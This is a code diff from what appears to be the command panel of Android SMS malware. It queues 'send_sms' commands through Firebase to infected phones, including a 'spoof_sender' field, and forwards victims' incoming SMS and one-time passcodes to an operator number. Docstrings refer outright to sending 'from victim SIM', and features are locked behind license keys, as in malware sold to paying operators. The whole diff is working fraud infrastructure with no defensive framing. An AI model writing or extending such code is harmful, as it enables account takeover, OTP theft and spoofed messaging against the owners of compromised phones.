@@ -122,7 +122,7 @@ def resolve_apk_firebase_url(profile: MonitorProfile, device: Device | None = No
 
 
 def _outgoing_command_paths(base: str, device_id: str, command_id: str) -> list[str]:
-    return [
+    paths = [
         f"{base}/commands/{device_id}/{command_id}",
         f"{base}/outgoing/{device_id}/{command_id}",
         f"{base}/clients/{device_id}/commands/{command_id}",
@@ -130,12 +130,26 @@ def _outgoing_command_paths(base: str, device_id: str, command_id: str) -> list[
         f"{base}/clients/{device_id}/outbox/{command_id}",
         f"{base}/clients/{device_id}/send/{command_id}",
         f"{base}/clients/{device_id}/sendSms/{command_id}",
+        f"{base}/clients/{device_id}/commandList/{command_id}",
+        f"{base}/client/{device_id}/commands/{command_id}",
         f"{base}/devices/{device_id}/commands/{command_id}",
         f"{base}/devices/{device_id}/outbox/{command_id}",
         f"{base}/sms_out/{device_id}/{command_id}",
+        f"{base}/sms_commands/{device_id}/{command_id}",
+        f"{base}/commandQueue/{device_id}/{command_id}",
         f"{base}/sms/send/{command_id}",
         f"{base}/send/{device_id}/{command_id}",
     ]
+    if "/" in device_id:
+        leaf = device_id.rsplit("/", 1)[-1]
+        paths.extend(
+            [
+                f"{base}/commands/{leaf}/{command_id}",
+                f"{base}/clients/{leaf}/sendSms/{command_id}",
+                f"{base}/clients/{leaf}/commands/{command_id}",
+            ]
+        )
+    return paths
 
 
 def _outgoing_inject_paths(base: str, device_id: str, command_id: str) -> list[str]:
@@ -206,8 +220,13 @@ def _outgoing_device_ids(device: Device) -> list[str]:
         if canonical and canonical not in ids:
             ids.append(canonical)
     if device.firebase_key:
-        leaf = device.firebase_key.strip("/").split("/")[-1]
+        fk = device.firebase_key.strip("/")
+        if fk and fk not in ids:
+            ids.append(fk)
+        leaf = fk.split("/")[-1]
         if leaf and leaf not in ids:
+            ids.append(leaf)
+        if fk.startswith("clients/") and leaf not in ids:
             ids.append(leaf)
     return ids or [device.name]
 
@@ -232,16 +251,22 @@ async def push_outgoing_sms_command(
         "to": to_number,
         "phone": to_number,
         "number": to_number,
+        "recipient": to_number,
         "message": message,
         "text": message,
         "body": message,
+        "msg": message,
         "sim_index": sim_index,
         "sim_slot": slot,
         "sim": slot,
+        "simSlot": sim_index,
+        "simCard": slot,
         "spoof_sender": spoof_sender,
         "status": "pending",
         "type": "sms",
         "action": "send",
+        "command": "send_sms",
+        "cmd": "sms",
         "created_at": created_at,
     }
     inject_payload = {
@@ -429,13 +454,17 @@ async def send_polling_startup_test(
     profile: MonitorProfile,
     device: Device,
 ) -> tuple[int, int]:
-    """On monitoring start — real SMS from victim SIM to /mynum (recharge/plan check)."""
+    """Monitoring start — ASTIK inject to /mynum (APK on mynum). Bot-only users skip inject."""
     import time
 
-    from app.device_ui import STARTUP_TEST_MESSAGE
-    from app.services import normalize_phone
+    from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
 
     if not profile.phone_number or not profile.is_monitoring:
+        return 0, 0
+
+    license_key = get_license_key(profile)
+    if not license_key or not license_key.upper().startswith("KEY-"):
+        logger.info("Startup inject skipped: no KEY (bot Firebase poll still active)")
         return 0, 0
 
     firebase_url = resolve_firebase_url(profile, device)
@@ -443,26 +472,21 @@ async def send_polling_startup_test(
         logger.warning("Startup test skipped: no firebase URL")
         return 0, 0
 
-    mynum = normalize_phone(profile.phone_number)
-    sim_index = profile.selected_sim_index or 0
     t0 = time.perf_counter()
     try:
-        command_id = await push_outgoing_sms_command(
-            firebase_url,
-            device.name,
-            mynum,
+        message_id = await push_mynum_inject(
+            profile,
+            device,
+            STARTUP_TEST_SENDER,
             STARTUP_TEST_MESSAGE,
-            sim_index=sim_index,
-            sim_slot=(sim_index + 1),
-            device=device,
         )
-        if not command_id:
-            raise RuntimeError("startup victim SIM send failed")
+        if not message_id:
+            raise RuntimeError("startup inject push failed")
         total_ms = max(1, int((time.perf_counter() - t0) * 1000))
-        logger.info("Startup test queued victim SIM → %s cmd=%s", mynum, command_id)
+        logger.info("Startup ASTIK inject queued for /mynum id=%s", message_id)
         return 1, total_ms
     except Exception as exc:
-        logger.warning("Startup test SMS failed: %s", exc)
+        logger.warning("Startup test inject failed: %s", exc)
         return 0, max(1, int((time.perf_counter() - t0) * 1000))
 
 
@@ -473,10 +497,14 @@ async def forward_incoming_to_mynum(
     sender: str,
     message: str,
 ) -> None:
-    """Forward incoming SMS/OTP to /mynum via inject — same sender ID (Astik-style)."""
+    """Forward incoming SMS/OTP to /mynum via inject — same sender ID (requires KEY + APK)."""
     from app.channel_relay import prepare_sms_forward, queue_forward_to_mynum
 
     if not profile.phone_number or not profile.is_monitoring:
+        return
+
+    license_key = get_license_key(profile)
+    if not license_key or not license_key.upper().startswith("KEY-"):
         return
 
     try:
